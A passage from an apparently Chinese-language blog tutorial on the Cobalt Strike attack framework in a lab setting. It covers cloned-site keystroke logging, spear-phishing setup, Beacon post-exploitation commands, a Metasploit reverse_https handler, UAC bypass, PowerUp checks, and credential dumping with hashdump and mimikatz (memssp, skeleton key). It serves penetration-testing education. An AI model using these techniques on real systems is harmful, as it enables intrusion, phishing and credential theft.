True</p><pre class="line-numbers language-none"><code class="language-none">set DisablePayloadHandler Trueset PrependMigrate True<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4、最后，开始攻击。</p><pre class="line-numbers language-none"><code class="language-none">exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="伪装—克隆网站"><a href="#伪装—克隆网站" class="headerlink" title="伪装—克隆网站"></a>伪装—克隆网站</h3><p>在向目标发送漏洞程序之前，我们将自己进行伪装一下，这样可以更好的保护自己，同时提高成功率。CS上有个克隆网站的功能，能够较好的帮助到我们。</p><p>首先，来到<code>Attacks --&gt; Web Drive-by --&gt; Clone Site</code>下，打开克隆网站的功能，之后写入待克隆网站的URL，在Attack中写入MSF中生成的URL。</p><p>其中<code>Log keystrokes on cloned site</code>选项如果勾选则可以获取目标的键盘记录，记录结果在Web Log中能够查看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后，浏览器打开克隆站点地址，如果目标存在漏洞，就可以被利用了，同时在CS中也会观察到主机上线。</p><h2 id="5、鱼叉式网络钓鱼"><a href="#5、鱼叉式网络钓鱼" class="headerlink" title="5、鱼叉式网络钓鱼"></a>5、鱼叉式网络钓鱼</h2><p>用CS进行钓鱼需要四个步骤：</p><p>1、创建一个目标清单</p><p>2、制作一个邮件模板或者使用之前制作好的模板</p><p>3、选择一个用来发送邮件的邮件服务器</p><p>4、发送邮件</p><p><strong>目标清单</strong></p><p>目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。</p><p>在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。</p><p>这里使用一些在线邮件接收平台的邮箱地址作为示例。</p><pre class="line-numbers language-none"><code class="language-none">astrqb79501@chacuo.nettest1gswtdm26180@chacuo.nettest2ypmgin95416@chacuo.nettest3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将以上内容保存为txt文本文件，就创建好了自己的目标清单。</p><p><strong>模板</strong></p><p>使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。</p><p>首先可以自己写一封邮件发给自己，或者直接从自己收件箱挑选一个合适的。有了合适的邮件之后，查看邮件原始信息，一般在邮件的选项里能找到这个功能。最后将邮件的原始信息保存为文件，一个模板就制作完成了。</p><p><strong>发送邮件</strong></p><p>有了目标和模板，然后选好自己的邮件服务器，之后就可以发送消息了。</p><p>在CS客户端中，点击<code>Attacks --&gt; Spear Phish</code>即可打开网络钓鱼模块。添加上目标、模板、钓鱼地址、邮箱服务、退回邮箱，其中Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致，否则会报错。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>所有信息添加完成后，可以点击Preview查看。如果感觉效果不错，就可以点击send发送了。</p><p>当目标收到钓鱼邮件，并且点击钓鱼邮件中的链接后，如果钓鱼链接配置的没有问题，CS就能够上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>由于此处是仅作为测试用途，所以模板中的链接都是自己的本地内网CS服务器地址，如果是真实环境中，则自然需要使用公网的地址才行。</p><p>在真实环境中的钓鱼邮件也不会像这里这么浮夸，真实环境中的钓鱼邮件往往都伪装成和正经儿的邮件一模一样，单从表面上看很难看出区别，因此提高自己的安全意识还是很重要滴。</p><h1 id="0x04-后渗透"><a href="#0x04-后渗透" class="headerlink" title="0x04 后渗透"></a>0x04 后渗透</h1><h2 id="1、Beacon-的管理"><a href="#1、Beacon-的管理" class="headerlink" title="1、Beacon 的管理"></a>1、Beacon 的管理</h2><p><strong>Beacon 控制台</strong></p><p>在一个 Beacon 会话上右击 <code>interact</code>（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs10-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。</p><p>Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。</p><p><strong>Beacon 菜单</strong></p><p>Access：包含了一些对凭据的操作及提权的选项</p><p>Explore：包含了信息探测与目标交互的选项</p><p>Pivoting：包含了一些设置代理隧道的选项</p><p>Session：包含了对当前 Beacon 会话管理的选项</p><p><strong>Beacon 命令</strong></p><p>help：查看 Beacon 命令的帮助信息。使用 help + 待查看帮助的命令可查看该命令的帮助信息。</p><p>clear：清除 Beacon 命令队列。Beacon 是一个异步的 Payload，输入的命令并不会立即执行，而是当 Beacon 连接到团队服务器时再一一执行命令，因此当需要清除队列命令时就可以使用 clear 命令。</p><p>sleep：改变 Beacon 的休眠时间。输入 <code>sleep 30</code>表示休眠30秒；输入<code>sleep 60 50</code>表示，随机睡眠 30秒至60秒，其中30秒 = 60 x 50%；如果输入 <code>sleep 0</code>则表示进入交互模式，任何输入的命令都会被立即执行，当输入一些命令，比如<code>desktop</code>时， Beacon 会自动进入交互模式。</p><p>shell：通过受害主机的 cmd.exe 执行命令。比如运行<code>ipconfig</code>，就需要输入<code>shell ipconfig</code></p><p>run：不使用 cmd.exe 执行命令。该命令也是 run + 命令的形式运行，该命令会将执行结果回显。</p><p>execute：执行命令，但不回显结果。</p><p>cd：切换当前工作目录。</p><p>pwd：查看当前所在目录。</p><p>powershell：通过受害主机的 PowerShell 执行命令。比如想在 PowerShell 下运行 <code>ipconfig</code>，就需要输入<code>powershell ipconfig</code></p><p>powerpick：不使用 powershell.exe 执行 powershell 命令。这个命令依赖于由 Lee Christensen 开发的非托管 PowerShell 技术。powershell 和 powerpick 命令会使用当前令牌（ token ）。</p><p>psinject：将非托管的 PowerShell 注入到一个特定的进程中并从此位置运行命令。</p><p>powershell-import：导入 PowerShell 脚本到 Beacon 中。直接运行 powershell-import + 脚本文件路径即可，但是这个脚本导入命令一次仅能保留一个 PowerShell 脚本，再导入一个新脚本的时候，上一个脚本就被覆盖了，因此可以通过导入一个空文件来清空 Beacon 中导入的脚本。</p><p>powershell get-help：获取 PowerShell 命令的相关帮助信息。比如想获取 PowerShell 下 get-process 命令的帮助，就需要输入<code>powershell get-help  get-process</code></p><p>execute-assembly：将一个本地的 .NET 可执行文件作为 Beacon 的后渗透任务来运行。</p><p>setenv：设置一个环境变量。</p><h2 id="2、会话传递"><a href="#2、会话传递" class="headerlink" title="2、会话传递"></a>2、会话传递</h2><p><strong>会话传递相关命令</strong></p><p>Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。</p><p><code>spawn</code>：进行会话的传递，也可直接右击会话选择<code>spawn</code>命令进行会话的选择。默认情况下，<code>spawn</code>命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用<code>spawnto</code>命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。</p><p><code>spawnto</code>：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入<code>spawnto</code>命令然后按 enter 会指示 Beacon 恢复至其默认行为。</p><p><code>inject</code>：输入<code>inject + 进程 id + 监听器名</code>来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用<code>inject [pid] x64</code>来将一个64位 Beacon 注入到一个 64位进程中。</p><p><code>spawn</code>和<code>inject</code>命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。</p><p><code>dllinject</code>：<code>dllinject + [pid]</code>来将一个反射性 DLL 注入到一个进程中。</p><p><code>shinject</code>：使用<code>shinject [pid] [架构] [/路径/.../file.bin]</code>命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。</p><p><code>shspawn</code>：使用<code>shspawn [架构] [/路径/.../file.bin]</code>命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。</p><p><code>dllload</code>：使用<code>dllload [pid] [c:\路径\...\file.dll]</code>来在另一个进程中加载磁盘上的 DLL文件。</p><p><strong>会话传递使用场景</strong></p><p>1、将当前会话传递至其他CS团队服务器中，直接右击<code>spawn</code>选择要传递的监听器即可。</p><p>2、将当前会话传递至MSF中，这里简单做一下演示。</p><p>首先，在MSF中，为攻击载荷新建一个payload</p><pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_httpsmsf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.175.156msf5 exploit(multi&#x2F;handler) &gt; set lport 443msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>随后，在CS中新建一个外部<code>Foreign</code>监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用<code>spawn</code>选择刚新建的外部监听器，MSF中即可返回会话。</p><h2 id="3、文件系统"><a href="#3、文件系统" class="headerlink" title="3、文件系统"></a>3、文件系统</h2><p>浏览会话系统文件位置在右击会话处，选择 <code>Explore --&gt; File Browser</code>即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。</p><p>在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。</p><p>彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。</p><p><strong>文件下载</strong></p><p><code>download</code>：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。</p><p><code>downloads</code>：查看当前 Beacon 正在进行的文件下载列表。</p><p><code>cancel</code>：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。</p><p>下载文件都将下载到CS团队服务器中，在<code>View --&gt; Download</code>下可看到下载文件的记录，选中文件后使用<code>Sync Files</code>即可将文件下载到本地。</p><p><strong>文件上传</strong></p><p><code>upload</code>：上传一个文件到目标主机上。</p><p><code>timestomp</code>：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。</p><h2 id="4、用户驱动溢出攻击"><a href="#4、用户驱动溢出攻击" class="headerlink" title="4、用户驱动溢出攻击"></a>4、用户驱动溢出攻击</h2><p>Beacon 运行任务的方式是以<code>jobs</code>去运行的，比如键盘记录、PowerShell 脚本、端口扫描等，这些任务都是在 beacon check in 之间于后台运行的。</p><p><code>jobs</code>：查看当前 Beacon 中的任务</p><p><code>jobkill</code>：加上任务 ID，对指定任务进行停止</p><p><strong>屏幕截图</strong></p><p><code>screenshot</code>：获取屏幕截图，使用<code>screenshot pid</code>来将截屏工具注入到一个 x86 的进程中，使用<code>screenshot pid x64</code>注入到一个 x64 进程中，explorer.exe 是一个好的候选程序。</p><p>使用<code>screenshot [pid] [x86|x64] [time]</code>来请求截屏工具运行指定的秒数，并在每一次 Beacon 连接到团队服务器的时候报告一张屏幕截图，这是查看用户桌面的一种简便方法。要查看截屏的具体信息，通过<code>View --&gt; Screenshots</code>来浏览从所有 Beacon 会话中获取的截屏。</p><p><strong>键盘记录</strong></p><p><code>keylogger</code>：键盘记录器，使用<code>keylogger pid</code>来注入一个 x86 程序。使用<code>keylogger pid x64</code>来注入一个 x64 程序，explorer.exe 是一个好的候选程序。</p><p>使用单独的 keylogger 命令来将键盘记录器注入一个临时程序。键盘记录器会监视从被注入的程序中的键盘记录并将结果报告给 Beacon，直到程序终止或者自己杀死了这个键盘记录后渗透任务。要查看键盘记录的结果，可以到<code>View --&gt; Keystrokes</code>中进行查看。</p><p><strong>其他</strong></p><p>除了上述使用命令的方式进行屏幕截图和键盘记录，也可以来到<code>Explore --&gt; Process List</code>下选择要注入的进程，再直接点击屏幕截图或键盘记录的功能按钮。</p><p>从使用上，具体注入那个程序都是可以的，只是注入 explorer.exe 会比较稳定与持久。值得注意的是，多个键盘记录器可能相互冲突，每个桌面会话只应使用一个键盘记录器。</p><h2 id="5、浏览器转发"><a href="#5、浏览器转发" class="headerlink" title="5、浏览器转发"></a>5、浏览器转发</h2><p>浏览器转发是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。如下图中，通过屏幕截图可以看到目标正在使用IE浏览器登陆着当前网站的admin账户。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs11-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>找到目前正在使用IE浏览器的目标后，右击该会话，选择<code>Explore --&gt; Browser Pivot</code>，随后选择要注入的进程，CS 会在它认为可以注入的进程右边显示一个对勾，设置好端口后，点击运行即可。</p><p>此时，在浏览器中配置代理，代理配置为http代理，IP为CS团队服务器IP，端口为刚设置的端口。</p><p>代理配置好后，在浏览器中打开目标当前正在打开的网址，即可绕过登录界面。</p><h2 id="6、端口扫描"><a href="#6、端口扫描" class="headerlink" title="6、端口扫描"></a>6、端口扫描</h2><p><code>portscan</code>：进行端口扫描，使用参数为：<code>portscan [targets] [ports] [discovery method]</code>。</p><p>目标发现<code>discovery method</code>有三种方法，分别是：<code>arp、icmp、none</code>，<code>arp</code>方法使用 ARP 请求来发现一个主机是否存活。<code>icmp</code>方法发送一个 ICMP echo 请求来检查一个目标是否存活。<code>none</code>选项让端口扫描工具假设所有的主机都是存活的。</p><p>端口扫描会在 Beacon 和团队服务器通讯的这个过程中不停运行。当它有可以报告的结果，它会把结果发送到 Beacon 控制台。Cobalt Strike 会处理这个信息并使用发现的主机更新目标模型。</p><p>右击 Beacon会话，在<code>Explore --&gt; Port Scan</code>中即可打开端口扫描的图形窗口，CS会自动填充扫描地址，确认扫描地址、端口、扫描方式等无误后，开始扫描即可。扫描结束后，在 target table页面中可看到扫描结果，右击会话，选择 Services 可查看详细的扫描结果。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs11-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h1><h2 id="1、用户账户控制"><a href="#1、用户账户控制" class="headerlink" title="1、用户账户控制"></a>1、用户账户控制</h2><p>自 Windows vista 开始，Windows 系统引进了用户账户控制机制，即 UAC<code>User Account Control</code>机制，UAC 机制在 Win 7中得到了完善。UAC 与 UNIX 中的 sudo 工作机制十分相似，平时用户以普通权限工作，当用户需要执行特权操作时，系统会询问他们是否要提升权限。</p><p>此时系统用户可分为以下三种等级：</p><p>高：管理员权限</p><p>中：一般用户权限</p><p>低：受限制的权限</p><p>使用<code>whoami /groups</code>命令可以看到当前用户所在的组以及权限，使用<code>net localgroup administrators</code>可以查看当前在管理员组里的用户名。</p><h2 id="2、提权操作"><a href="#2、提权操作" class="headerlink" title="2、提权操作"></a>2、提权操作</h2><p>当某些操作需要管理员权限，而当前用户权限只有一般用户权限时，就需要提权操作了。</p><p>在 CS 中有以下几种提权操作：</p><p><code>bypassuac</code>：将本地中级管理员权限提升至本地高级管理员权限，适用于Win 7 及以上的系统。</p><p><code>elevate</code>：将任意用户的权限提升至系统权限，适用于2018年11月更新之前的 Win 7 和 Win 10 系统。</p><p><code>getsystem</code>：将本地高级管理员权限提升至系统权限。</p><p><code>runas</code>：使用其他用户的凭证来以其他用户身份运行一个命令，该命令不会返回任何输出。</p><p><code>spawnas</code>：使用其他用户的凭证来以其他用户身份派生一个会话，这个命令派生一个临时的进程并将 payload stage 注入进那个进程。</p><h3 id="Spawn-As"><a href="#Spawn-As" class="headerlink" title="Spawn As"></a>Spawn As</h3><p>首先，右击待提权的会话，选择<code>Access --&gt; Spawn As</code>，输入目标系统用户身份信息，其中域信息填写一个“点”代表本地用户，监听器这里选择的 SMB 监听器，之后点击运行就能看到对应的用户上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs12-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><p>Bypass UAC 有两个步骤，分别是：</p><p>1、利用 UAC 漏洞来获取一个特权文件副本</p><p>2、使用 DLL 劫持进行代码执行</p><p>首先使用<code>shell whoami /groups</code>查看当前上线主机用户的所属组及 UAC 等级</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs13-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>通过返回信息可以看出，当前用户为管理员权限，UAC 等级为中，根据上一节中关于的介绍，此时可以使用<code>bypassuac</code>进行提权。</p><p>首先，右击会话，选择<code>Access --&gt; Elevate</code>，这里选择一个 SMB Beacon，Exploit 选择<code>uac-token-duplication</code>，最后 Launch 即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs13-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>待 Beacon Check in 后，当前用户 UAC 为高权限的会话便会上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs13-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、PowerUp"><a href="#3、PowerUp" class="headerlink" title="3、PowerUp"></a>3、PowerUp</h2><p>PowerUp 所做的事是寻找可能存在弱点的地方，从而帮助提权。</p><p>利用 PowerUp 进行提权需要首先导入 ps1 文件<code>powershell-import PowerUp.ps1</code>，再执行<code>powershell Invoke-AllChecks</code>命令，使用 PowerUp 脚本可以快速的帮助我们发现系统弱点，从而实现提权的目的。</p><blockquote><p>其中<code>PowerUp.ps1</code>文件可从这里下载：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p></blockquote><p><strong>PowerUp 的使用</strong></p><p>执行以下命令：将 ps1 文件上传到目标主机，并执行所有弱点检查。</p><pre class="line-numbers language-none"><code class="language-none">powershell-import PowerUp.ps1powershell invoke-allchecks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>详细运行过程：</p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; powershell-import PowerUp.ps1[*] Tasked beacon to import: PowerUp.ps1[+] host called home, sent: 275084 bytesbeacon&gt; powershell invoke-allchecks[*] Tasked beacon to run: invoke-allchecks[+] host called home, sent: 313 bytes[+] received output:[*] Running Invoke-AllChecks[+] Current user already has local administrative privileges![*] Checking for unquoted service paths...[*] Checking service executable and argument permissions...[+] received output:ServiceName                     : AeLookupSvcPath                            : C:\Windows\system32\svchost.exe -k netsvcsModifiableFile                  : C:\Windows\system32ModifiableFilePermissions       : GenericAllModifiableFileIdentityReference : BUILTIN\AdministratorsStartName                       : localSystemAbuseFunction                   : Install-ServiceBinary -Name &#39;AeLookupSvc&#39;CanRestart                      : True……内容太多，此处省略……[*] Checking service permissions...[+] received output:ServiceName   : AeLookupSvcPath          : C:\Windows\system32\svchost.exe -k netsvcsStartName     : localSystemAbuseFunction : Invoke-ServiceAbuse -Name &#39;AeLookupSvc&#39;CanRestart    : True……内容太多，此处省略……[*] Checking %PATH% for potentially hijackable DLL locations...[+] received output:Permissions       : GenericAllModifiablePath    : C:\Windows\system32\WindowsPowerShell\v1.0\IdentityReference : BUILTIN\Administrators%PATH%            : %SystemRoot%\system32\WindowsPowerShell\v1.0\AbuseFunction     : Write-HijackDll -DllPath &#39;C:\Windows\system32\WindowsPowerS                    hell\v1.0\\wlbsctrl.dll&#39;……内容太多，此处省略……[*] Checking for AlwaysInstallElevated registry key...[*] Checking for Autologon credentials in registry...[*] Checking for modifidable registry autoruns and configs...[+] received output:Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Use                 r ProcessPath           : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot; -n vmusrModifiableFile : @&#123;Permissions&#x3D;System.Object[]; ModifiablePath&#x3D;C:\Program Files                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference&#x3D;BUILTIN\A                 dministrators&#125;……内容太多，此处省略……[*] Checking for modifiable schtask files&#x2F;configs...[+] received output:TaskName     : GoogleUpdateTaskMachineCoreTaskFilePath : @&#123;Permissions&#x3D;System.Object[]; ModifiablePath&#x3D;C:\Program Files (               x86)\Google\Update\GoogleUpdate.exe; IdentityReference&#x3D;BUILTIN\A               dministrators&#125;TaskTrigger  : &lt;Triggers xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;windows&#x2F;2004&#x2F;02&#x2F;mi               t&#x2F;task&quot;&gt;&lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;&#x2F;Enabled&gt;&lt;&#x2F;LogonTrigger&gt;&lt;Cal               endarTrigger&gt;&lt;StartBoundary&gt;2020-04-11T21:47:44&lt;&#x2F;StartBoundary&gt;&lt;               ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;&#x2F;DaysInterval&gt;&lt;&#x2F;ScheduleByDay&gt;&lt;&#x2F;Ca               lendarTrigger&gt;&lt;&#x2F;Triggers&gt;……内容太多，此处省略……[*] Checking for unattended install files...UnattendPath : C:\Windows\Panther\Unattend.xml[*] Checking for encrypted web.config strings...[*] Checking for encrypted application pool and virtual directory passwords...[*] Checking for plaintext passwords in McAfee SiteList.xml files....[+] received output:[*] Checking for cached Group Policy Preferences .xml files....[+] received output:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果在自己的靶机上发现导入ps1文件失败，这可能是因为系统不允许执行不信任的脚本文件导致的。</p><p>这时为了复现成功可以来到靶机下，以管理员权限打开 Powershell，运行<code>set-ExecutionPolicy RemoteSigned</code>，输入<code>Y</code>回车，此时系统便能导入<code> PowerUp.ps1</code>文件了。</p><pre class="line-numbers language-none"><code class="language-none">PS C:\WINDOWS\system32&gt; set-ExecutionPolicy RemoteSigned执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): YPS C:\WINDOWS\system32&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在运行<code>Invoke-AllChecks</code>后，便会列出当前系统中可被提权的弱点之处，之后再执行检查结果中<code>AbuseFunction</code>下的命令便能开始提权操作了。</p><p>但是我在自己本地环境中并未复现成功，执行<code>AbuseFunction</code>后的命令只能创建一个与当前登录用户相同权限的账户，没能达到提权的目的。</p><p>参考网上相关文章后也未果，这也是为什么这一节拖更这么久的原因，因此 PowerUp 的复现过程暂时就没法记录了。</p><p>如果正在看本篇文章的你有过使用 PowerUp 提权成功的经历，欢迎留言分享。</p><h2 id="4、凭证和哈希获取"><a href="#4、凭证和哈希获取" class="headerlink" title="4、凭证和哈希获取"></a>4、凭证和哈希获取</h2><p>想要获取凭证信息，可以在管理员权限的会话处右击选择<code>Access --&gt; Dump Hashes</code>，或者在控制台中使用<code>hashdump</code>命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs14-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>想获取当前用户的密码，可以运行<code>mimikatz</code>，右击管理员权限会话选择<code>Access --&gt; Run Mimikatz</code>，或在控制台运行<code>logonpasswords</code>命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs14-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在<code>View --&gt; Credentials</code>下可以查看到<code>hashdump</code>与<code>mimikatz</code>获取的数据。</p><h2 id="5、Beacon-中的-Mimikatz"><a href="#5、Beacon-中的-Mimikatz" class="headerlink" title="5、Beacon 中的 Mimikatz"></a>5、Beacon 中的 Mimikatz</h2><p>在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：</p><ul><li><p><code>mimikatz [module::command] &lt;args&gt;</code></p><p>运行 mimikatz 命令</p></li><li><p><code>mimikatz [!module::command] &lt;args&gt;</code></p><p>强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行。</p></li></ul><ul><li><p><code>mimikatz [@module::command] &lt;args&gt;</code></p><p>使用当前 Beacon 的访问令牌运行 mimikatz 命令</p></li></ul><p>下面是一些<code>mimikatz</code>命令。</p><ul><li><p><code>!lsadump::cache</code></p><p>获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希</p></li><li><p><code>!lsadump::sam</code></p><p>获取本地账户密码哈希，该命令与 hashdump 比较类似</p></li><li><p><code>misc::cmd</code></p><p>如果注册表中禁用了 CMD ，就重新启用它</p></li><li><p><code>!misc::memssp</code></p><p>注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\windows\system32\mimilsa.log”中</p></li><li><p><code>misc::skeleton</code></p><p>该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。</p></li><li><p><code>process::suspend [pid]</code></p><p>挂起某个进程，但是不结束它</p></li><li><p><code>process::resume [pid]</code></p><p>恢复挂起的进程</p></li></ul><p>以上的这些只是<code>mimikatz</code>能做事情的一小部分，下面看看<code>!misc::memssp</code>的使用。</p><pre class="line-numbers language-none"><code class="language-none">mimikatz !misc::memsspcd C:\Windows\system32shell dir mimilsa.logshell type mimilsa.log<span aria-hidden="true" 